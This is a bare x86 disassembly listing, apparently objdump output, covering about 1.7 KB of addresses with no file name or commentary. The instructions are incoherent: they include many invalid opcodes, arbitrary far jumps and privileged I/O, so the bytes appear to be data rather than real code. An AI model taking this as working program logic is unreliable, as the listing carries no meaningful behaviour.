  41af6b:	jb     0x41af4f
  41af6d:	fcom   QWORD PTR [esp+ebp*2-0xd]
  41af71:	mov    dh,0xde
  41af73:	dec    ebp
  41af74:	fnsave [eax-0x42753dbb]
  41af7a:	lods   eax,DWORD PTR ds:[esi]
  41af7b:	mov    ebx,0x9211d73a
  41af80:	inc    edx
  41af81:	aad    0x56
  41af83:	outs   dx,BYTE PTR ds:[esi]
  41af84:	jmp    0x41af82
  41af86:	or     ebp,DWORD PTR [edi]
  41af88:	fild   DWORD PTR [edi-0x3ab33434]
  41af8e:	jp     0x41af69
  41af90:	or     BYTE PTR [esi-0x48],bh
  41af93:	and    BYTE PTR [eax+0x52a9dde5],dl
  41af99:	inc    esp
  41af9a:	mov    BYTE PTR [edx+ecx*1],bh
  41af9d:	and    esp,DWORD PTR [ebp-0x133107dd]
  41afa3:	arpl   ax,di
  41afa5:	pop    edx
  41afa6:	stos   BYTE PTR es:[edi],al
  41afa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afa9:	dec    edi
  41afaa:	stos   DWORD PTR es:[edi],eax
  41afab:	das    
  41afac:	pusha  
  41afad:	push   ds
  41afae:	xchg   edx,eax
  41afaf:	inc    ebp
  41afb0:	pop    eax
  41afb1:	inc    ebx
  41afb2:	int3   
  41afb3:	in     al,dx
  41afb4:	aaa    
  41afb5:	or     DWORD PTR [eax-0xc31a7ec],ebx
  41afbb:	sbb    BYTE PTR [ecx-0x1a],ch
  41afbe:	xchg   edi,eax
  41afbf:	std    
  41afc0:	jle    0x41af79
  41afc2:	mov    al,ds:0x4017b9
  41afc7:	inc    edx
  41afc8:	jmp    0x62dd:0x84451e52
  41afcf:	pop    eax
  41afd0:	mov    dl,0x7b
  41afd2:	xchg   ecx,eax
  41afd3:	outs   dx,DWORD PTR ds:[esi]
  41afd4:	sbb    BYTE PTR [edi],0xbd
  41afd7:	cdq    
  41afd8:	rcl    ebx,1
  41afda:	xor    al,0x42
  41afdc:	mov    edi,DWORD PTR [ecx]
  41afde:	loope  0x41b00c
  41afe0:	in     al,0xf6
  41afe2:	jo     0x41afd8
  41afe4:	stos   DWORD PTR es:[edi],eax
  41afe5:	jmp    0x79f7fb0f
  41afea:	adc    al,0xad
  41afec:	sub    ah,bh
  41afee:	movnti DWORD PTR [esi-0x7f9a6f13],edx
  41aff5:	jnp    0x41b00d
  41aff7:	jle    0x41b01d
  41aff9:	jns    0x41b017
  41affb:	gs inc eax
  41affd:	push   0x32
  41afff:	popf   
  41b000:	and    BYTE PTR [eax+0x5091b513],al
  41b006:	jmp    0x7d5c:0x4a4aff04
  41b00d:	pop    edx
  41b00e:	bound  ecx,QWORD PTR [ebp-0x923017d]
  41b014:	(bad)  
  41b016:	ror    ah,cl
  41b018:	daa    
  41b019:	loope  0x41b089
  41b01b:	les    ebp,FWORD PTR [esi+0x4f]
  41b01e:	mov    WORD PTR [ecx+0x7d6ba303],fs
  41b024:	lods   eax,DWORD PTR ds:[esi]
  41b025:	xchg   edx,eax
  41b026:	xor    DWORD PTR [edi+eiz*1],edx
  41b029:	fucomp st(3)
  41b02b:	or     BYTE PTR [esi+0x2d],cl
  41b02e:	jne    0x41b038
  41b030:	mov    ds:0xe8d3bf94,eax
  41b035:	mov    esi,DWORD PTR [ecx-0x420139e3]
  41b03b:	sub    DWORD PTR [ebx+esi*4-0x80],esi
  41b03f:	pop    ss
  41b040:	leave  
  41b041:	clc    
  41b042:	outs   dx,DWORD PTR ds:[esi]
  41b043:	jne    0x41b0c0
  41b045:	(bad)  
  41b046:	je     0x41b049
  41b048:	enter  0xb62a,0x7
  41b04c:	stc    
  41b04d:	ds into 
  41b04f:	cmp    al,0xe7
  41b051:	push   esi
  41b052:	outs   dx,DWORD PTR ds:[esi]
  41b053:	ins    BYTE PTR es:[edi],dx
  41b054:	add    DWORD PTR [eax],esi
  41b056:	xor    BYTE PTR [ebx-0x50],ch
  41b059:	adc    al,0xf
  41b05b:	and    BYTE PTR [ebp+0x57d1665],bh
  41b061:	sbb    al,0xbf
  41b063:	pop    ds
  41b064:	xor    bl,BYTE PTR [ecx]
  41b066:	iret   
  41b067:	xchg   edi,eax
  41b068:	sahf   
  41b069:	push   0xfffffffc
  41b06b:	repnz add ch,dh
  41b06e:	sub    cl,BYTE PTR [ecx-0x19]
  41b071:	pop    esi
  41b072:	xor    BYTE PTR [esi-0x67],ch
  41b075:	pop    eax
  41b076:	and    DWORD PTR [ebx+0x4ecf933f],esp
  41b07c:	dec    eax
  41b07d:	add    eax,0x4f8d3819
  41b082:	jmp    0x41b0ea
  41b084:	test   eax,0xf33052ce
  41b089:	mov    esp,0x50e564b3
  41b08e:	sub    al,0xe6
  41b090:	mov    WORD PTR [esp+ecx*1-0x39b748b],gs
  41b097:	scas   eax,DWORD PTR es:[edi]
  41b098:	out    dx,al
  41b099:	pop    es
  41b09a:	sbb    dl,BYTE PTR [edi+0xc]
  41b09d:	int    0xac
  41b09f:	mov    bh,bl
  41b0a1:	popa   
  41b0a2:	retf   0x306b
  41b0a5:	scas   al,BYTE PTR es:[edi]
  41b0a6:	dec    eax
  41b0a7:	jp     0x41b0f2
  41b0a9:	cwde   
  41b0aa:	sub    al,0x8b
  41b0ac:	out    0xdf,eax
  41b0ae:	ins    BYTE PTR es:[edi],dx
  41b0af:	mov    ch,BYTE PTR [edx-0x5f11b3c1]
  41b0b5:	jne    0x41b044
  41b0b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0b8:	lds    ecx,FWORD PTR [eax-0x5b9b7192]
  41b0be:	sbb    eax,0x84b85354
  41b0c3:	shr    DWORD PTR [eax],0x98
  41b0c6:	xchg   esi,eax
  41b0c7:	mov    bl,0x35
  41b0c9:	pop    edi
  41b0ca:	sub    eax,0xd0c80693
  41b0cf:	jle    0x41b106
  41b0d1:	int3   
  41b0d2:	or     DWORD PTR [ebx-0x6e16ba2b],ebp
  41b0d8:	jno    0x41b063
  41b0da:	jns    0x41b08f
  41b0dc:	xor    bl,BYTE PTR [esi-0x72bef749]
  41b0e2:	les    esi,FWORD PTR [esi]
  41b0e4:	push   ss
  41b0e5:	mov    BYTE PTR [ecx-0x1562529],cl
  41b0eb:	xor    al,BYTE PTR [ebp-0x2a]
  41b0ee:	add    BYTE PTR [ebp-0x6e],0xe0
  41b0f2:	push   es
  41b0f3:	(bad)  
  41b0f4:	mov    ebx,0x4d01ce02
  41b0f9:	sbb    ch,0x9e
  41b0fc:	std    
  41b0fd:	push   esp
  41b0fe:	inc    esp
  41b0ff:	ds inc ebx
  41b101:	stos   DWORD PTR es:[edi],eax
  41b102:	sbb    dh,al
  41b104:	(bad)  
  41b105:	es enter 0xc92f,0xfe
  41b10a:	test   al,0x10
  41b10c:	xor    esi,DWORD PTR [edx-0x27]
  41b10f:	mov    bl,0xd3
  41b111:	aad    0xdd
  41b113:	jle    0x41b0f0
  41b115:	ret    
  41b116:	mov    bl,0x6
  41b118:	leave  
  41b119:	lods   eax,DWORD PTR ds:[esi]
  41b11a:	pop    esp
  41b11b:	and    al,0x39
  41b11d:	inc    edx
  41b11e:	out    0xc4,al
  41b120:	adc    BYTE PTR [eax-0x6a],bl
  41b123:	je     0x41b158
  41b125:	mov    edi,0x2e1dcdb9
  41b12a:	mov    ds:0xd1d7ab6d,eax
  41b12f:	add    BYTE PTR [edi],ah
  41b131:	sub    al,0x5f
  41b133:	inc    ecx
  41b134:	sub    al,0x87
  41b136:	jb     0x41b0b8
  41b138:	data16 aam 0xe
  41b13b:	mov    ecx,0x96f95d67
  41b140:	push   esi
  41b141:	loope  0x41b173
  41b143:	dec    eax
  41b144:	lods   al,BYTE PTR ds:[esi]
  41b145:	add    BYTE PTR [edi-0x54],0x62
  41b149:	sub    al,0x2e
  41b14b:	fwait
  41b14c:	mov    WORD PTR [ebx+0x5f46a401],cs
  41b152:	dec    ebx
  41b153:	pop    ds
  41b154:	pusha  
  41b155:	lods   eax,DWORD PTR ds:[esi]
  41b156:	push   0x5
  41b158:	hlt    
  41b159:	mov    edi,0x42c24b75
  41b15e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b15f:	imul   ebx,DWORD PTR [edx],0xe27df06
  41b165:	mov    ch,BYTE PTR [ecx]
  41b167:	jne    0x41b16b
  41b169:	loope  0x41b190
  41b16b:	jo     0x41b105
  41b16d:	cdq    
  41b16e:	ss inc eax
  41b170:	or     DWORD PTR [ebx],eax
  41b172:	jno    0x41b13c
  41b174:	cmp    BYTE PTR [esi-0x61],al
  41b177:	ja     0x41b1b4
  41b179:	or     bl,bl
  41b17b:	pop    esi
  41b17c:	xchg   edx,eax
  41b17d:	lock cmp al,0x92
  41b180:	(bad)  
  41b181:	push   esp
  41b182:	xor    al,0x86
  41b184:	dec    esi
  41b185:	out    0xcf,eax
  41b187:	test   BYTE PTR [ebp-0x60492e02],cl
  41b18d:	test   al,0x28
  41b18f:	jg     0x41b13e
  41b191:	pop    ebp
  41b192:	aam    0x21
  41b194:	ins    BYTE PTR es:[edi],dx
  41b195:	fistp  WORD PTR [ecx]
  41b197:	push   cs
  41b198:	cmp    al,BYTE PTR [esi]
  41b19a:	ss int3 
  41b19c:	(bad)  
  41b19d:	gs mov dh,0x6f
  41b1a0:	push   0x480bdb7
  41b1a5:	int3   
  41b1a6:	xchg   esp,ebx
  41b1a8:	mov    dh,0xf9
  41b1aa:	add    eax,0x8ff276f0
  41b1af:	clc    
  41b1b0:	stc    
  41b1b1:	inc    ebx
  41b1b2:	pushf  
  41b1b3:	in     eax,dx
  41b1b4:	cmp    eax,0xdc54075d
  41b1b9:	mov    ah,0x93
  41b1bb:	cmp    BYTE PTR [edx+0x5a],0x5e
  41b1bf:	mov    ds:0x71817956,al
  41b1c4:	xchg   esi,eax
  41b1c5:	dec    ecx
  41b1c6:	adc    DWORD PTR [edx+0x1c],eax
  41b1c9:	add    BYTE PTR ds:0x3aa76290,dl
  41b1cf:	add    dl,ah
  41b1d1:	inc    ebx
  41b1d2:	cdq    
  41b1d3:	xchg   ebx,eax
  41b1d4:	ss pop esp
  41b1d6:	mov    ecx,0x5149b899
  41b1db:	clc    
  41b1dc:	mul    BYTE PTR [edx+0x64]
  41b1df:	and    BYTE PTR [ebx+0x24],ch
  41b1e2:	sbb    eax,0x117643dc
  41b1e7:	mov    ds,edi
  41b1e9:	sub    eax,0x2c5b32a3
  41b1ee:	mov    ebp,0x37c92481
  41b1f3:	cdq    
  41b1f4:	das    
  41b1f5:	jne    0x41b22c
  41b1f7:	fs mov esi,0xf1f21ba2
  41b1fd:	pop    ebx
  41b1fe:	xchg   edi,eax
  41b1ff:	pushf  
  41b200:	pop    ecx
  41b201:	push   ss
  41b202:	sub    eax,0x5bc3f794
  41b207:	rcl    BYTE PTR [ebp+0x60b64f9f],1
  41b20d:	aad    0x46
  41b20f:	arpl   WORD PTR [eax],bx
  41b211:	xchg   esp,eax
  41b212:	inc    edi
  41b213:	or     bl,BYTE PTR [esi-0x35]
  41b216:	dec    edx
  41b217:	or     ebx,DWORD PTR [ebx-0x13d837f0]
  41b21d:	xchg   ebx,eax
  41b21e:	sbb    al,0x65
  41b220:	out    0x3f,al
  41b222:	xor    BYTE PTR [edi-0x62588419],0x32
  41b229:	jnp    0x41b1df
  41b22b:	sbb    al,0xe1
  41b22d:	mov    cl,0x97
  41b22f:	mov    dh,0x69
  41b231:	sahf   
  41b232:	sub    eax,0x3bd314b4
  41b237:	xchg   ebx,eax
  41b238:	shl    cl,0x67
  41b23b:	xchg   ebx,eax
  41b23c:	dec    edi
  41b23d:	mov    edi,DWORD PTR [ebx-0x4377b38]
  41b243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b244:	adc    al,0xbc
  41b246:	mov    eax,0x2bfe180d
  41b24b:	mov    edx,0x5b8de45e
  41b250:	or     edi,0xfffffff2
  41b253:	mov    bh,0x4e
  41b255:	pop    esi
  41b256:	push   eax
  41b257:	xabort 0xd5
  41b25a:	clc    
  41b25b:	adc    ah,BYTE PTR [ebp-0x33768316]
  41b261:	lahf   
  41b262:	(bad)  
  41b263:	mov    bl,0x33
  41b265:	icebp  
  41b266:	das    
  41b267:	sti    
  41b268:	xor    WORD PTR [edx],0x51
  41b26c:	cld    
  41b26d:	daa    
  41b26e:	jl     0x41b20a
  41b270:	fwait
  41b271:	xchg   ebx,eax
  41b272:	fist   WORD PTR [esi+ebp*2]
  41b275:	xchg   edx,eax
  41b276:	pop    ss
  41b277:	js     0x41b251
  41b279:	outs   dx,DWORD PTR ds:[esi]
  41b27a:	scas   eax,DWORD PTR es:[edi]
  41b27b:	in     eax,dx
  41b27c:	cmp    ah,BYTE PTR [ebx]
  41b27e:	push   esi
  41b27f:	inc    esp
  41b280:	retf   0x3b0
  41b283:	xor    eax,0x7279ae5
  41b288:	or     ch,BYTE PTR [edi-0x4e7878d8]
  41b28e:	inc    esi
  41b28f:	aam    0x29
  41b291:	test   BYTE PTR [eax+0x19ce2bda],ch
  41b297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b298:	inc    eax
  41b299:	and    DWORD PTR [esi-0x46],esp
  41b29c:	les    eax,FWORD PTR [ebx]
  41b29e:	add    BYTE PTR [edx],dl
  41b2a0:	xchg   DWORD PTR [esi-0x5f],edx
  41b2a3:	and    al,BYTE PTR [esi+0x2feee29f]
  41b2a9:	dec    esi
  41b2aa:	sbb    eax,edx
  41b2ac:	pop    es
  41b2ad:	pop    ebx
  41b2ae:	popa   
  41b2af:	mov    dl,0x57
  41b2b1:	stos   DWORD PTR es:[edi],eax
  41b2b2:	mov    ebp,DWORD PTR [ebx+0x151e6894]
  41b2b8:	xchg   ecx,eax
  41b2b9:	dec    edx
  41b2ba:	jne    0x41b29f
  41b2bc:	xlat   BYTE PTR ds:[ebx]
  41b2bd:	or     al,0x67
  41b2bf:	int3   
  41b2c0:	test   eax,0x73a2299d
  41b2c5:	cmpxchg DWORD PTR [eax-0x5d],ecx
  41b2c9:	cli    
  41b2ca:	(bad)  
  41b2cb:	mov    DWORD PTR [ecx-0x37266150],esp
  41b2d1:	js     0x41b338
  41b2d3:	sub    eax,0xbdec7e4b
  41b2d8:	addr16 loope 0x41b276
  41b2db:	or     dl,al
  41b2dd:	mov    edx,0x6ba02656
  41b2e2:	(bad)  
  41b2e3:	or     esp,DWORD PTR [edx-0x49670ff2]
  41b2e9:	pop    ecx
  41b2ea:	outs   dx,DWORD PTR ds:[esi]
  41b2eb:	mov    ds:0xd5331773,al
  41b2f0:	xor    al,0x6a
  41b2f2:	xchg   esp,eax
  41b2f3:	loop   0x41b2ce
  41b2f5:	inc    ebp
  41b2f6:	dec    ecx
  41b2f7:	mov    BYTE PTR [eax-0x42],dh
  41b2fa:	popf   
  41b2fb:	inc    edi
  41b2fc:	jp     0x41b2c7
  41b2fe:	xor    al,0x5c
  41b300:	cmp    BYTE PTR [eax+eiz*8],al
  41b303:	and    dh,BYTE PTR gs:[ebx+0x16]
  41b307:	stos   DWORD PTR es:[edi],eax
  41b308:	pop    esp
  41b309:	lahf   
  41b30a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b30b:	sbb    DWORD PTR [ebp+0x68f63e46],ebx
  41b311:	in     al,0xd9
  41b313:	lock lock imul eax,esi,0x24
  41b318:	rcr    dl,1
  41b31a:	out    dx,eax
  41b31b:	pushf  
  41b31c:	arpl   bx,cx
  41b31e:	pusha  
  41b31f:	cmc    
  41b320:	(bad)  
  41b321:	popf   
  41b322:	sbb    al,0x6d
  41b324:	mov    esi,0xbae7caeb
  41b329:	xor    DWORD PTR [edi],0xfcd97838
  41b32f:	and    eax,0x72a252cb
  41b334:	fdiv   QWORD PTR [ecx+ecx*8]
  41b337:	aaa    
  41b338:	adc    ebx,DWORD PTR fs:[ebp+0x4]
  41b33c:	lods   al,BYTE PTR ds:[esi]
  41b33d:	aad    0x25
  41b33f:	bound  ebx,QWORD PTR [esi+0x33]
  41b342:	pop    ss
  41b343:	inc    ecx
  41b344:	mov    ebx,DWORD PTR [eax-0x3cd76158]
  41b34a:	cmc    
  41b34b:	mov    fs,WORD PTR [esi+edx*4+0x25]
  41b34f:	mov    cx,bp
  41b352:	lods   eax,DWORD PTR ds:[esi]
  41b353:	in     eax,0x82
  41b355:	call   0xb061:0x51f796bb
  41b35c:	aaa    
  41b35d:	sti    
  41b35e:	rol    BYTE PTR [esi],0x64
  41b361:	call   0x3a35d778
  41b366:	arpl   WORD PTR [edi+0x4f0dba],ax
  41b36c:	rol    DWORD PTR [esi+0x18],1
  41b36f:	out    dx,al
  41b370:	mov    ds:0x2dbeb275,al
  41b375:	hlt    
  41b376:	inc    ebx
  41b377:	or     al,0x4b
  41b379:	pushf  
  41b37a:	sub    al,al
  41b37c:	inc    esi
  41b37d:	jmp    0x41b344
  41b37f:	pop    edi
  41b380:	mov    ecx,0x9320d9c8
  41b385:	enter  0x6db6,0x22
  41b389:	and    eax,0xba140735
  41b38e:	int    0x26
  41b390:	and    DWORD PTR [edi+edx*4],eax
  41b393:	or     eax,0x961f300d
  41b398:	(bad)  
  41b399:	daa    
  41b39a:	clc    
  41b39b:	sbb    eax,0x44ba1e10
  41b3a0:	mov    ds:0x18973331,eax
  41b3a5:	test   al,0x50
  41b3a7:	inc    edx
  41b3a8:	sbb    eax,0x82701610
  41b3ad:	adc    bl,BYTE PTR [ecx]
  41b3af:	loop   0x41b40e
  41b3b1:	in     eax,dx
  41b3b2:	pop    DWORD PTR [esi+0x6dcdc03a]
  41b3b8:	jnp    0x41b393
  41b3ba:	mov    edi,0x70ccc9a0
  41b3bf:	lock jecxz 0x41b3c9
  41b3c2:	(bad)  
  41b3c3:	sar    DWORD PTR [edi],0x49
  41b3c6:	popa   
  41b3c7:	sub    BYTE PTR [ecx],al
  41b3c9:	popa   
  41b3ca:	je     0x41b365
  41b3cc:	sub    dl,BYTE PTR [ebx-0x20]
  41b3cf:	or     bh,al
  41b3d1:	xchg   edx,eax
  41b3d2:	and    al,0x13
  41b3d4:	sub    eax,0x7727d89
  41b3d9:	xchg   DWORD PTR [esi+0x5fb591d4],ebp
  41b3df:	mov    ebp,0x93662da6
  41b3e4:	jle    0x41b369
  41b3e6:	call   0x7d27:0xaf71d9ca
  41b3ed:	or     al,0x81
  41b3ef:	mov    eax,ebx
  41b3f1:	mov    bl,0x3f
  41b3f3:	nop
  41b3f4:	push   0x6a
  41b3f6:	and    eax,0x298238c0
  41b3fb:	shr    DWORD PTR [ecx+ebp*2+0x3feda72f],cl
  41b402:	lahf   
  41b403:	or     al,0xd5
  41b405:	jl     0x41b44d
  41b407:	cs mov bh,0x5d
  41b40a:	and    al,0xa4
  41b40c:	cmc    
  41b40d:	lock inc esi
  41b40f:	or     BYTE PTR [edi],ah
  41b411:	mov    ds:0xb3424e9d,al
  41b416:	xchg   BYTE PTR [ecx+0x15],ch
  41b419:	mov    ebx,0x22d6e359
  41b41e:	jmp    0x3ee4aa3a
  41b423:	jl     0x41b46b
  41b425:	xchg   esi,eax
  41b426:	retf   0x4039
  41b429:	inc    ebp
  41b42a:	and    al,BYTE PTR [edx-0x14ab36c1]
  41b430:	dec    ecx
  41b431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b432:	pop    edi
  41b433:	stc    
  41b434:	cmp    dl,ah
  41b436:	ror    ch,1
  41b438:	mov    al,0x71
  41b43a:	iret   
  41b43b:	mov    al,BYTE PTR [ebp-0x21]
  41b43e:	nop
  41b43f:	jb     0x41b4ba
  41b441:	out    dx,al
  41b442:	cmp    dh,cl
  41b444:	shr    BYTE PTR [ecx],0xa5
  41b447:	(bad)  
  41b448:	int3   
  41b449:	cs fcmovb st,st(6)
  41b44c:	lahf   
  41b44d:	mov    ch,0x6c
  41b44f:	xor    BYTE PTR [ebx+0x20],dh
  41b452:	clc    
  41b453:	aad    0xf
  41b455:	cdq    
  41b456:	push   edx
  41b457:	sbb    DWORD PTR [ecx-0x2cba1f9f],edi
  41b45d:	inc    esp
  41b45e:	pop    edx
  41b45f:	dec    edx
  41b460:	and    BYTE PTR [edi],bl
  41b462:	leave  
  41b463:	hlt    
  41b464:	add    eax,0x3c3966f1
  41b469:	and    BYTE PTR [ecx+0x4e26067b],al
  41b46f:	or     ah,al
  41b471:	mov    bh,0x61
  41b473:	adc    BYTE PTR [esi+0x64],dh
  41b476:	and    DWORD PTR ds:0x59d68b98,0xb20a1d62
  41b480:	aaa    
  41b481:	mov    ch,0xb4
  41b483:	jge    0x41b461
  41b485:	mov    cl,0xd9
  41b487:	inc    esi
  41b488:	inc    edi
  41b489:	popf   
  41b48a:	test   al,0xf2
  41b48c:	ret    0x75c1
  41b48f:	pop    ebp
  41b490:	je     0x41b4dd
  41b492:	out    dx,al
  41b493:	and    al,0xf9
  41b495:	xchg   ebx,eax
  41b496:	std    
  41b497:	push   cs
  41b498:	sub    al,0xfa
  41b49a:	mov    eax,es:0x676d24da
  41b4a0:	test   eax,0x3534ac25
  41b4a5:	xchg   edi,eax
  41b4a6:	or     BYTE PTR [esi-0x16],0x90
  41b4aa:	mov    ds:0x3b780857,eax
  41b4af:	cmp    dl,BYTE PTR [ebx+0x3]
  41b4b2:	popf   
  41b4b3:	mov    al,0x49
  41b4b5:	pop    edx
  41b4b6:	cli    
  41b4b7:	add    al,0x8d
  41b4b9:	or     al,0x51
  41b4bb:	add    eax,0xa26a51a
  41b4c0:	retf   0x124
  41b4c3:	mov    ch,BYTE PTR [ebx+ebp*8+0x6e09608d]
  41b4ca:	(bad)  
  41b4cb:	jnp    0x41b53b
  41b4cd:	test   al,0xcf
  41b4cf:	push   eax
  41b4d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4d1:	and    al,0x5d
  41b4d3:	cld    
  41b4d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4d5:	jge    0x41b518
  41b4d7:	jg     0x41b4b6
  41b4d9:	mov    eax,ds:0x6216d0b0
  41b4de:	ja     0x41b48c
  41b4e0:	pop    esp
  41b4e1:	call   0x5d8ef83
  41b4e6:	or     eax,0xb794371e
  41b4eb:	out    dx,eax
  41b4ec:	adc    DWORD PTR [edi+eiz*1],edi
  41b4ef:	mov    ah,0x42
  41b4f1:	push   cs
  41b4f2:	jno    0x41b4bf
  41b4f4:	and    esp,ebx
  41b4f6:	mov    ebx,0x4164c74d
  41b4fb:	sahf   
  41b4fc:	enter  0x398e,0xc5
  41b500:	ret    0x14b8
  41b503:	data16 (bad) 
  41b505:	and    DWORD PTR [esi],ebx
  41b507:	int    0xf
  41b509:	xchg   esi,eax
  41b50a:	stc    
  41b50b:	pop    eax
  41b50c:	mov    ch,cl
  41b50e:	out    dx,al
  41b50f:	jns    0x41b56a
  41b511:	jmp    0x41b521
  41b513:	jmp    DWORD PTR [ecx]
  41b515:	clc    
  41b516:	imul   ebx,DWORD PTR [ebp-0xa0a07da],0x21
  41b51d:	xchg   dl,ah
  41b51f:	call   0x6602:0x3b42bedd
  41b526:	and    bh,ch
  41b528:	(bad)  
  41b529:	out    0x6f,al
  41b52b:	jae    0x41b4bf
  41b52d:	xchg   ebx,eax
  41b52e:	sbb    al,0x70
  41b530:	sbb    ecx,eax
  41b532:	jecxz  0x41b586
  41b534:	imul   eax,DWORD PTR [ecx],0xffffff9b
  41b537:	test   BYTE PTR [ebx-0x28],ch
  41b53a:	vmaxpd xmm0,xmm0,xmm3
  41b53e:	add    al,0xf2
  41b540:	test   BYTE PTR [edx+0x3bf731fd],ch
  41b546:	pusha  
  41b547:	xor    al,BYTE PTR [edx+0x5ad8ea64]
  41b54d:	rcl    DWORD PTR [ecx+0x651286f6],0x76
  41b554:	sub    ecx,DWORD PTR [esi+0x39]
  41b557:	adc    DWORD PTR [edi+0x20],esp
  41b55a:	pop    ebp
  41b55b:	lea    ebx,[eax+0x227f93be]
  41b561:	test   eax,0x8bdbd2b7
  41b566:	dec    edi
  41b567:	mov    bl,0x67
  41b569:	ja     0x41b59c
  41b56b:	rol    ebp,1
  41b56d:	jnp    0x41b59f
  41b56f:	dec    esp
  41b570:	fmul   QWORD PTR [ebx+0x70]
  41b573:	jl     0x41b55d
  41b575:	idiv   BYTE PTR [ebp+0x192102f0]
  41b57b:	scas   al,BYTE PTR es:[edi]
  41b57c:	xchg   BYTE PTR [edi-0x34],dl
  41b57f:	jno    0x41b514
  41b581:	jl     0x41b548
  41b583:	mov    ds:0xcb3a5949,al
  41b588:	imul   esp,DWORD PTR [esi+eax*8+0x3f2f3430],0x650eed33
  41b593:	or     edi,ecx
  41b595:	xor    eax,0xb860b2b2
  41b59a:	out    dx,eax
  41b59b:	jecxz  0x41b5b8
  41b59d:	dec    esp
  41b59e:	xchg   edx,eax
  41b59f:	aad    0x63
  41b5a1:	mov    bh,0x8
  41b5a3:	mov    ch,0xb5
  41b5a5:	mov    dh,0x54
  41b5a7:	jmp    0xf7d24453
  41b5ac:	jmp    0xca3f:0x80db8713
  41b5b3:	xor    al,BYTE PTR [ebp+0x4]
  41b5b6:	sbb    DWORD PTR [ebx+0x5f],edi
  41b5b9:	out    0x3f,al
  41b5bb:	xchg   BYTE PTR [esi-0x67],bh
  41b5be:	les    edi,FWORD PTR [ebx+ebx*1-0x6f7838f3]
  41b5c5:	jle    0x41b626
  41b5c7:	add    bh,BYTE PTR [eax+ecx*1+0x64f93369]
  41b5ce:	mov    dl,0x24
  41b5d0:	leave  
  41b5d1:	mov    ds:0x8e1d6572,al
  41b5d6:	mov    DWORD PTR [ebp+0x2efdb3f6],ebx
  41b5dc:	sbb    dl,BYTE PTR [edx-0x36148ec0]
  41b5e2:	int    0xd
  41b5e4:	cmp    BYTE PTR [ebp-0x1c],al
  41b5e7:	cdq    
  41b5e8:	xor    dh,BYTE PTR [eax]
  41b5ea:	ret    0xe18e
  41b5ed:	or     eax,0xc62d82d
  41b5f2:	jp     0x41b5eb
  41b5f4:	test   al,0xd3
  41b5f6:	out    dx,eax
  41b5f7:	mov    ecx,0xc4e7f6dc
  41b5fc:	mov    dh,0xb6
  41b5fe:	icebp  
  41b5ff:	fist   WORD PTR [eax]
  41b601:	inc    eax
  41b602:	add    esi,esi
  41b604:	in     eax,0x10
  41b606:	(bad)
  41b609:	sub    BYTE PTR [edi],0x68
  41b60c:	out    dx,al
  41b60d:	sbb    al,0x6a
  41b60f:	cmp    bl,dh
  41b611:	in     al,dx
  41b612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b613:	push   esp
  41b614:	popf   
  41b615:	adc    BYTE PTR [ebx+0x5233e13],cl
  41b61b:	xchg   ebp,eax
  41b61c:	js     0x41b668
  41b61e:	add    DWORD PTR [ecx],ecx
  41b620:	mov    al,ds:0x99957451
  41b625:	mov    esp,0x334bffee
  41b62a:	jl     0x41b5c3
  41b62c:	test   al,0xd3
  41b62e:	or     dh,BYTE PTR [esi+edi*4]
  41b631:	rcr    DWORD PTR [ecx+0x31db609f],cl
  41b637:	inc    esi
  41b638:	ins    DWORD PTR es:[edi],dx
  41b639:	inc    ecx
  41b63a:	or     al,dl
  41b63c:	mov    ah,0xed
  41b63e:	jae    0x41b683
  41b640:	jns    0x41b69c
  41b642:	(bad)  
  41b643:	lods   eax,DWORD PTR ds:[esi]
  41b644:	dec    esi
  41b645:	leave  
  41b646:	or     al,0xfd
  41b648:	addr16 cli 
  41b64a:	pop    esi
  41b64b:	call   0xde2a:0x213c97a6
  41b652:	pop    ss
  41b653:	mov    ch,0x14
  41b655:	cmp    eax,DWORD PTR [ebx+0x71abfdf4]
  41b65b:	js     0x41b6af
  41b65d:	push   ss
  41b65e:	sub    ecx,edi
  41b660:	sbb    eax,0xc7fe8b7f
  41b665:	xlat   BYTE PTR ds:[ebx]
  41b666:	mov    esp,0x301067e5
  41b66b:	test   DWORD PTR [edi],esp
  41b66d:	jecxz  0x41b66e
  41b66f:	push   esi
  41b670:	cmp    BYTE PTR [esi-0x1d4832f7],0x23
  41b677:	cwde   
  41b678:	repnz pop ss
  41b67a:	mov    bl,0xdc
  41b67c:	xchg   esi,eax
  41b67d:	inc    ecx
  41b67e:	mov    WORD PTR [edx+0x54],cs
  41b681:	sub    eax,0xc101ef4e
  41b686:	pop    esp
  41b687:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b688:	ret    0x367b
  41b68b:	adc    BYTE PTR [ebx+0x454a5d16],ah
  41b691:	pusha  
  41b692:	jl     0x41b685
  41b694:	mov    ebp,eax
  41b696:	adc    BYTE PTR [ecx],0x8
  41b699:	jo     0x41b64a
  41b69b:	adc    al,0x2b
  41b69d:	xor    ah,bh
  41b69f:	xor    ecx,DWORD PTR [ebx*8+0x247f1c85]
  41b6a6:	mov    al,ds:0xfebfd209
  41b6ab:	mov    bl,0xcd
  41b6ad:	retf   0x2334
  41b6b0:	inc    esi
  41b6b1:	(bad)  
  41b6b2:	cmp    edi,edx
  41b6b4:	test   eax,0xbe7ffd52
  41b6b9:	ror    ebx,cl
  41b6bb:	hlt    
  41b6bc:	cmp    esi,eax
  41b6be:	je     0x41b6ff
  41b6c0:	retf   0xbb5f
  41b6c3:	mov    bh,0xb5
  41b6c5:	in     eax,dx
  41b6c6:	clc    
  41b6c7:	aam    0x1a
  41b6c9:	aam    0xe3
  41b6cb:	mov    esp,0x1d13fbbf
  41b6d0:	fbld   TBYTE PTR [ebp+edi*2-0x6bf40eff]
  41b6d7:	add    al,0x10
  41b6d9:	sbb    ecx,DWORD PTR [eax+ecx*1]
  41b6dc:	push   eax
  41b6dd:	call   0xa14e:0xdd5718fc
  41b6e4:	in     al,dx
  41b6e5:	sub    al,0x8d
